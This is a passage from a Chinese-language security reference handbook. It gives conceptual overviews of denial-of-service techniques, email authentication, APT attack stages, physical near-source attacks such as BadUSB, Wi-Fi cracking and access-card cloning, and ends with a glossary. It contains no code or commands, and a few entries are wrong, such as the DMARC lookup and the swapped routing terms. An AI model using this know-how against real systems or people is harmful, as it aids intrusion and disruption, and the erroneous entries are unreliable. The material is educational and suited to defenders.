
    -   特殊的 key 值 \\x00 \\x0d \\ud800 \" 等

    -   序列化

    -   #### 特定的数值

        -   超过上限的整数

        -   科学计数法

        -   null 值的不同表示

2.  ### 参考链接 {#参考链接-60}

#### 相关规范

-   [RFC 8259 The JavaScript Object Notation (JSON) Data Interchange Format](https://tools.ietf.org/html/rfc8259)

-   [ECMA-404 The JSON data interchange syntax](https://www.ecma-international.org/publications-and-standards/standards/ecma-404/)

-   [json5](https://json5.org/)

2.  ## 拒绝服务攻击

    1.  ### 简介

> DoS（Denial of Service）指拒绝服务，是一种常用来使服务器或网络瘫痪的网络攻击手段。
>
> 在平时更多提到的是分布式拒绝服务（DDoS，Distributed Denial of Service）攻击，该攻击是指利用足够数量的傀儡计算机产生数量巨大的攻击数据包，对网络上的一台或多台目标实施 DDoS 攻击，成倍地提高威力，从而耗尽受害目标的资源，迫使目标失去提供正常服务的能力。

### UDP 反射

> 基于 UDP 文的反射 DDoS 攻击是拒绝服务攻击的一种形式。攻击者不直接攻击目标，而是利用互联网中某些开放的服务器，伪造被攻击者的地址并向该服务器发送基于 UDP 服务的特殊请求报文，使得数倍于请求报文的数据被发送到被攻击 IP，从而对后者间接形成 DDoS 攻击。
>
> 常用于 DoS 攻击的服务有:

-   NTP

-   DNS

-   SSDP

-   Memcached

> 其中 DNS 攻击主要是指 DNS Request Flood、DNS Response Flood、虚假源 + 真实源 DNS Query Flood、权威服务器攻击和 Local 服务器攻击。

### TCP Flood

> TCP Flood 是一种利用 TCP 协议缺陷的攻击，这种方式通过伪造 IP 向攻击服务器发送大量伪造的 TCP SYN 请求，被攻击服务器回应握手包后（SYN+ACK），因为伪造的 IP 不会回应之后的握手包，服务器会保持在 SYN_RECV 状态，并尝试重试。这会使得 TCP 等待连接队列资源耗尽，正常业务无法进行。

### Shrew DDoS

> Shrew DDoS 利用了 TCP 的重传机制，调整攻击周期来反复触发 TCP 协议的 RTO，达到攻击的效果。其数据包以固定的、恶意选择的慢速时间发送，这种模式能够将 TCP 流量限制为其理想速率的一小部分，同时以足够低的平均速率进行传输以避免检测。
>
> 现代操作系统已经对 TCP 协议进行了相应的修改，使得其不受影响。

### Ping Of Death

> 在正常情况下不会存在大于 65536 个字节的 ICMP 包，但是报文支持分片重组机制。通过这种方式可以发送大于 65536 字节的 ICMP 包并在目标主机上重组，最终会导致被攻击目标缓冲区溢出，引起拒绝服务攻击。
>
> 现代操作系统已经对这种攻击方式进行检查，使得其不受影响。

### Challenge Collapsar (CC)

> CC 攻击是一种针对资源的 DoS 攻击，攻击者通常会常用请求较为消耗服务器资源的方式来达到目的。
>
> CC 攻击的方式有很多种，常见的攻击可以通过大量访问搜索页、物品展示页等消耗大的功能来实现。部分
>
> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}HTTP 服务器也可通过上传超大文件、发送大量 复杂的参数的请求来实现攻击。

### 慢速攻击

> HTTP 慢速攻击是由 Wong Onn Chee 和 Tom Brennan 在 2012 年的 OWASP 大会上正式披露，用低速发包来消耗服务器资源以达到拒绝服务的目的。
>
> 慢速攻击分为 Slow headers / Slow body / Slow read 三种攻击方式。Slow headers 一直不停的慢速发送 HTTP 头部，消耗服务器的连接和内存资源。Slow body 发送一个 Content-Length 很大的 HTTP POST 请求，每次只发送很少量的数据，使该连接一直保持存活。Slow read 以很低的速度读取 Response。

8.  ### 基于服务特性

    -   #### 压缩包解压

        -   巨大的 0 字节的压缩包

    -   #### 读文件

        -   读 /dev/urandom 等无限制的文件

    -   #### 受限制的反序列化

        -   反序列化巨大的数组

    -   #### 正则解析

        -   消耗巨大的回溯表达式

9.  ### 常用的防护方式

    -   基于特定攻击的指纹检测攻击，对相应流量进行封禁/限速操作

    -   对正常流量进行建模，对识别出的异常流量进行封禁/限速操作

    -   基于 IP/端口进行综合限速策略

    -   基于地理位置进行封禁/限速操作

10. ### 参考链接 {#参考链接-61}

    -   [linux academy dos](https://linuxacademy.com/howtoguides/posts/show/topic/13191-denial-of-service-dos)

    -   [slowhttptest](https://github.com/shekyan/slowhttptest) Application Layer DoS attack simulator

    -   [Slowloris wiki](https://en.wikipedia.org/wiki/Slowloris_(computer_security))

&nbsp;

3.  ## 邮件安全

    1.  ### 常用概念

> 邮件安全常用的概念是 SPF、DKIM 和 DMARC。其中 SPF (Sender Policy Framework) 是一条特殊的 DNS

记录，用于设定合法的发送邮件的 IP。

> DKIM (DomainKeys Identified Mail) 将数字签名添加到电子邮件消息的标题中，使邮件服务器拥有确保邮件内容没有更改的能力，同样 DKIM 也存在于 DNS 中。通过查询 \<selector\>.\_domainkey.example.com的 txt 记录查询。
>
> DMARC(Domain-based Message Authentication): 通过查询 \<selector\>.\_domainkey.example.com 的 txt
>
> 记录查询。

4.  # APT

    1.  ### 简介

> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}APT (Advanced Persistent Threat)，翻译为高级持续威胁。2006 年，APT 攻击的概念被正式提出，用来描述从 20 世纪 90 年代末到 21 世纪初在美国军事和政府网络中发现的隐蔽 持续的网络攻击。
>
> APT 攻击多用于指利用互联网进行网络间谍活动，其目标大多是获取高价值的敏感情报或者控制目标系统，对目标系统有着非常严重的威胁。
>
> 发起 APT 攻击的通常是一个组织，其团体是一个既有能力也有意向持续而有效地进行攻击的实体。个人或者小团体发起的攻击一般不会被称为 APT，因为即使其团体有意图攻击特定目标，也很少拥有先进和持久的资源来完成相应的攻击行为。
>
> APT 的攻击手段通常包括供应链攻击、社会工程学攻击、零日攻击和僵尸网络等多种方式。其基于这些攻击手段将将自定义的恶意代码放置在一台或多台计算机上执行特定的任务，并保持在较长的时间内不被发现。
>
> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}和传统的大面积扫描的攻击方式不同，因为 APT 攻击通常只面向单一特定的目标， 多数攻击会综合一系列手段来完成一次 APT 攻击，使其有着非常高的隐蔽性和复杂性，让对 APT 攻击的检测变得相当困难。顾名思义，APT 的特征主要体现在下面这三个方面。

### 高级性（Advanced）

> APT 攻击会结合当前所有可用的攻击手段和技术，使得攻击具有极高的隐蔽性和渗透性。
>
> 网络钓鱼就是其中的一种攻击方式。攻击者通常会结合社会工程学等手段来伪造可信度非常高的电子邮件，冒充目标信任的公司或者组织来发送难以分辨真假的对目标诱惑度很高恶意电子邮件。通过这些邮件来诱使被受害者访问攻击者控制的网站或者下载恶意代码。
>
> APT 攻击通常还会采用其他的方式来伪装自己的攻击行为，从而实现规避安全系统检测的目的。比如有的恶意代码会通过伪造合法签名来逃避杀毒软件检测。以震网病毒为例，其在攻击时就使用了白加黑的模式，利用合法的证书对其代码进行了签名，这种攻击方式会使得大部分恶意代码查杀引擎会直接认为恶意代码是合法的，而不进行任何的检测。
>
> 除了利用合法签名绕过检测，APT 攻击者在攻击过程中也经常利用第三方的站点作为媒介来攻击目标，而不是使用传统的点到点攻击模式。这种模式通常被称为水坑攻击。
>
> 水坑攻击是一种入侵的手法，一般来说，是在攻击者对目标有一定了解后，确定攻击目标经常访问的网站，而后入侵其中的一个或几个网站，并对这些网站植入恶意代码，最后来实现借助该网站感染目标的能力。因为这种攻击借助了目标信任的第三方网站，攻击的成功率相对钓鱼攻击来说要高出很多。
>
> 另外一个能体现 APT 攻击高级性的特征是零日漏洞，目前国际上黑市一个零日漏洞的价格在数十万到数百万不等，每一个零日漏洞的稳定利用都需要大量的资源投入。而在 APT 攻击中，零日漏洞的利用非常广泛。以 APT28 为例，据统计，仅 2015 年一年当中 APT28 在攻击中就至少使用了六个零日漏洞。

### 持续性（Persistent）

> 和传统的基于短期利益的网络攻击有很大的不同。APT 攻击的过程通常包括多个实施阶段。攻击者很很多情况下都是使用逐层渗透的方式来突破高级的防御系统，整个攻击过程一般持续时间会达到几个月甚至数年。一般来说，APT 攻击可以分为以下几个阶段。

#### 侦查阶段

> 为了能够找到目标的脆弱点，攻击者通常会做大量的准备工作。在这个阶段攻击者多会使用基于大数据分析的隐私收集或者基于社会工程学的攻击来收集目标的信息，为了之后的攻击做出充分的准备。

#### 初次入侵阶段

> 基于初次侦查的信息，攻击者通常能收集到目标所使用的软件、操作系统系统版本等信息。在获取这些信息后，攻击者可以挖掘软件对应版本的零日漏洞或者使用已知漏洞来对系统做出初期的入侵行为，获取对目标一定的控制权限。

#### 权限提升阶段

> 在复杂网络中，攻击者初次入侵所获得的权限通常是较低的权限，而为了进一步的攻击，攻击者需要获取更高的权限来完成其需要的攻击行为。在这个阶段，攻击者通常会使用权限提升漏洞或者爆破密码等行为来实现权限提升的目的，最后获得系统甚至域的管理员权限。

#### 保持访问阶段

> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}在成功入侵目标计算机并 有一定的权限之后，攻击者一般会使用各种方式来保持对系统的访问权限。其中一个比较常用的方式是窃取合法用户的登录凭证。当获取了用户的访问凭证之后，可以使用远程控制工具

（RAT，Remote Access Tools）来建立连接，并在连接建立之后，植入特定的后门来达到持续控制的效果。

#### 横向扩展阶段

> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}当攻击者掌握一定的目标之后，会以较慢 较隐蔽的方式逐渐在内网扩散。主要方式是先在内网进行一定的侦查。基于这些侦查，获得内网计算机的相关信息，并结合这些信息使用软件漏洞或者弱密码爆破等手段来进行横向的进一步渗透，获取更多的权限和信息。

#### 攻击收益阶段

> APT 攻击的主要目的是窃取目标系统的信息或对其造成一定的破坏。在完成横向扩展控制一定的内网机器后。以收集信息为目标的攻击者会使用加密通道的方式把获取的信息逐渐回传并消除入侵痕迹。而以造成破坏为目标的攻击，则在这个阶段进行相应的攻破坏。

### 威胁性（Threat）

> 和传统攻击不同，APT 攻击的攻击手段和方案大都是针对特定的攻击对象和目的来设计。相对其他攻击，攻击者有着非常明确的目标和目的，很少会使用自动化的攻击方式，而是精确的攻击。
>
> 另外 APT 的目标多是政府机构、金融、能源等敏感企业、部门，一旦这些目标被成功攻击，其影响往往十分巨大。据目前已知的信息，在美国、俄罗斯等国的大选中，以及欧洲一些政治事件中，都有 APT 攻击出现。APT 攻击已经成为国家之前斗争的一种重要手段。

5.  ### 相关事件

    -   2010 年伊朗震网病毒

    -   2013 美国棱镜门事件

    -   \...

6.  ### IoC

> IoC (Indicators of Compromise) 在取证领域被定义为计算机安全性被破坏的证据。常见的 IoC 有以下几种：

-   hash

-   IP

-   域名

-   网络

-   主机特征

-   工具

-   TTPs

7.  ### 参考链接 {#参考链接-62}

    -   [APT 分析及 TTPs 提取](https://projectsharp.org/2020/02/23/APTåˆ†æžåŠTTPsæå–)

&nbsp;

5.  ## 供应链安全

    1.  ### 参考链接 {#参考链接-63}

        -   [Introducing SLSA, an End-to-End Framework for Supply Chain Integrity](https://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html)

6.  ## 近源渗透

    1.  ### USB 攻击

#### BadUSB

> 通过重新编程 USB 设备的内部微控制器，来执行恶意操作，例如注册为键盘设备，发送特定按键进行恶意操作。

#### AutoRUN

> 根据主机配置的方式，一些操作系统会自动执行位于 USB 设备存储器上的预定文件。可以通过这种方式执行恶意软件。

#### USB Killer

> 通过特殊的 USB 设备基于电气等方式来永久销毁设备。

#### 侧信道

> 通过改装 USB 增加一些监听/测信道传输设备。

#### HID 攻击

> HID(human interface device) 指键盘、鼠标等用于为计算机提供数据输入的人机交互设备。HID 攻击指攻击者将特殊的 USB 设备模拟成为键盘，一旦连接上计算机就执行预定的恶意操作。HID 攻击可以基于 Android设备、数据线设备等实施。

### Wi-Fi

#### 密码爆破

基于WPA2的验证方式，Wi-Fi可以通过抓握手包的方式进行线下的密码爆破。

#### 信号压制

可以使用大功率的设备捕获握手包并模仿目标AP，从而实现中间人攻击。

### 门禁

#### 电磁脉冲

部分电子门禁和电子密码锁的电子系统中集成电路对电磁脉冲比较敏感，可以通过外加电磁脉冲 (Electro- magnetic Pulse，EMP) 的方式破坏设备，来实现打开的效果。

#### IC 卡

基于变色龙等设备可以使用模拟、破解、复制 IC 卡破解门禁。

4.  ### 参考链接 {#参考链接-64}

    -   [近源渗透硬件指北](https://www.secpulse.com/archives/123723.html)

    -   [红蓝对抗之近源渗透](https://mp.weixin.qq.com/s/dmh3dDt0BaZYIcWdSTsQcg)

&nbsp;

7.  ## 常见术语

    1.  ### 系统相关

        -   WMI (Windows Management Instrumentation)

    2.  ### 网络相关

#### 网络协议

-   轻型目录访问协议 (Lightweight Directory Access Protocol, LDAP)

-   标识名 (Distinguished Name, DN)

-   相对标识名 (Relative Distinguished Name, RDN)

-   服务器消息块 (Server Message Block, SMB)

-   网络文件共享系统 (Common Internet File System, CIFS)

-   SMTP (Simple Mail Transfer Protocol)

-   简单网络管理协议 (Simple Network Management Protocol, SNMP)

-   POP3 (Post Office Protocol 3)

-   IMAP (Internet Mail Access Protocol)

-   HTTP (HyperText Transfer Protocol)

-   HTTPS (HyperText Transfer Protocol over Secure Socket Layer)

-   动态主机配置协议 (Dynamic Host Configuration Protocol, DHCP)

-   远程过程调用 (Remote Procedure Call, RPC)

-   Java 调试线协议 (Java Debug Wire Protocol, JDWP)

-   网络文件系统 (Network File System, NFS)

-   服务主体名称 (Service Principal Names, SPN)

-   简单身份验证 (Simple Authentication and Security Layer, SASL)

-   链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR)

#### 路由系统

-   自治系统 (Autonomous System, AS)

-   内部网关协议 (Interior Gateway Protocol, IGP)

-   外部网关协议 (External Gateway Protocol, EGP)

-   域内路由选择 (interdomain routing)

-   域间路由选择 (intradomain routing)

-   路由信息协议 (Routing Information Protocol, RIP)

-   开放最短路径优先 (Open Shortest Path First, OSPF)

-   动态路由协议 (Dynamic Routing Protocols, DRP)

-   首跳冗余性协议 (First Hop Redundancy Protocols, FHRP)

-   热备份路由器协议 (Hot Standby Router Protocol, HSRP)

-   虚拟路由冗余协议 (Virtual Router Redundancy Protocol, VRRP)

-   网关负载均衡协议 (Gateway Load Balancing Protocol, GLBP)

-   网络地址转换 (Network Address Translation, NAT)

-   点对点协议 (Point-to-Point Protocol, PPP)

-   生成树协议 (Spanning Tree Protocol, STP)

-   QUIC (Quick UDP Internet Connections)

#### 网络应用

-   证书透明度 (Certificate Transparency, CT)

-   DNS证书颁发机构授权 (DNS Certification Authority Authorization, CAA)

-   应用级网关 (Application Level Gateway, ALG)

#### Kerberos

-   密钥分发中心 (Key Distribution Center, KDC)

-   认证服务器 (Authentication Server, AS)

-   票据授权服务器 (Ticket Granting Server, TGS)

3.  ### 开发相关

    -   REST(Representation State Transformation)

4.  ### 安全相关

    -   #### 缺点(defect / mistake)

        -   软件在实现上和设计上的弱点

        -   缺点是缺陷和瑕疵的统称

    -   #### 缺陷 (bug)

        -   实现层面的软件缺点

        -   容易被发现和修复

        -   例如：缓冲区溢出

    -   #### 瑕疵 (flaw)

        -   一种设计上的缺点，难以察觉

        -   瑕疵往往需要人工分析才能发现

        -   软件系统中错误处理或恢复模块，导致程序不安全或失效

    -   #### 漏洞 (vulnerability)

        -   可以用于违反安全策略的缺陷或瑕疵

    -   交互式应用程序安全测试 (Interactive Application Security Testing, IAST)

    -   动态应用程序安全测试 (Dynamic Application Security Testing, DAST)

    -   静态应用程序安全测试 (Static Application Security Testing, SAST)

    -   ATT&CK™(Adversarial Tactics, Techniques, and Common Knowledge, ATT&CK)

    -   横向移动(Lateral Movement)

#### 安全开发 {#安全开发-2}

-   安全信息和事件管理(Security Information Event Management, SIEM)

-   自动化响应SOAR模型 (Security Orchestration, Automation and Response, SOAR)

-   SDL(Security Development Lifecycle)

#### 安全策略

-   跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)

-   发件人策略框架 (Sender Policy Framework, SPF)

-   域名密钥识别邮件 (DomainKeys Identified Mail, DKIM)

-   基于域名的消息认证报告与一致性协议 (Domain-based Message Authentication, Reporting and Con- formance, DMARC)

-   DNSSEC (The Domain Name System Security Extensions)

-   基于 DNS 的命名实体身份验证 (DNS-based Authentication of Named Entities, DANE)

#### 安全模型

-   构建安全成熟度模型 (Building Security In Maturity Model, BSIMM)

### 攻击相关

#### 漏洞类型

-   跨站脚本攻击 (Cross Site Scripting, XSS)

-   跨站请求伪造 (Cross-Site Request Forgery, CSRF)

-   中间人攻击 (Man-in-the-middle, MITM)

-   服务端请求伪造 (Server Side Request Forgery, SSRF)

-   高级持续威胁 (Advanced Persistent Threat, APT)

-   远程命令执行 (Remote Command Execute, RCE)

-   远程代码执行 (Remote Code Execute, RCE)

-   带外数据 (Out-Of-Band, OOB)

#### 攻击方式

-   鱼叉攻击 (Spear Phishing)

-   水坑攻击 (Water Holing)

-   分布式拒绝服务 (Distributed Denial of Service, DDoS)

6.  ### 防御相关

    -   IoC (Indicators of Compromise)

#### 防御技术 {#防御技术-1}

-   网络检测响应 (Network-based Detection and Response, NDR)

-   终端检测响应 (Endpoint Detection and Response, EDR)

-   托管检测响应 (Managed Detection and Response, MDR)

-   扩展检测响应 (Extended Detection and Response, XDR)

-   自适应安全架构 (Adaptive Security Architecture, ASA)

-   零信任网络访问 (Zero Trust Network Access, ZTNA)

-   云安全配置管理 (Cloud Security Posture Management, CSPM)

#### 防护设施

-   入侵检测系统 (Intrusion Detection System, IDS)

-   主机型入侵检测系统 (Host-based Intrusion Detection System, HIDS)

-   主机入侵防御系统 (Host Intrusion Prevent System, HIPS)

-   RASP (Runtime Application Self-protection)

-   统一端点管理 (Unified Endpoint Management, UEM)

7.  ### 运维

    -   智能运维 (Artificial Intelligence for IT Operations, AIOps)

    -   风险和脆弱性评估 (Risk and Vulnerability Assessments, RVA)

    -   计算机安全应急响应组 (Computer Emergency Response Team, CERT)

8.  ### 认证

    -   单点登录 (Single Sign-On, SSO)

    -   双因素认证 (Two-Factor Authentication, 2FA)

    -   多因素认证 (Multi-Factor Authentication, MFA)

    -   一次性密码 (One-Time Password, OTP)

#### Kerbose

-   认证服务器 (Authentication Server, AS)

-   密钥分发中心 (Key Distribution Center, KDC)

-   票据授权票据，票据的票据 (Ticket Granting Ticket, TGT)

-   票据授权服务器 (Ticket Granting Server, TGS)

-   特定服务提供端 (Service Server, SS)

9.  ### 可信计算

    -   可信平台模块 (Trusted Platform Module, TPM)

10. ### 云

#### 容器

-   容器运行时 (Container Runtime Interface, CRI)

-   开放容器标准 (Open Container Initiative, OCI)

-   开放容器格式标准 (Open Container Format, OCF)

#### 计算

-   弹性云计算 (Elastic Compute Cloud, EC2)

-   阿里云弹性云计算 (Elastic Compute Service, ECS)

-   云服务器 (Cloud Virtual Machine, CVM)

#### 存储

-   简单存储服务 (Simple Storage Service, S3)

-   对象存储 (Cloud Object Storage, COS)

#### XaaS

-   函数即服务 (Function as a Service, FaaS)

-   容器即服务 (Container as a Service, CaaS)

-   软件即服务 (Software as a Service, SaaS)

-   平台即服务 (Platform as a Service, PaaS)

-   基础设施即服务 (Insfrastructure as a Service, IaaS)

#### 特定平台

-   OCI (Oracle Cloud Infrastructure)

#### 其他服务

-   元数据服务 (Instance Metadata Service, IMDS)

-   持续集成 (Continuous Integration, CI)

-   持续交付 (Continuous Deployment, CD)

-   边缘计算机器 (Edge Computing Machine, ECM)
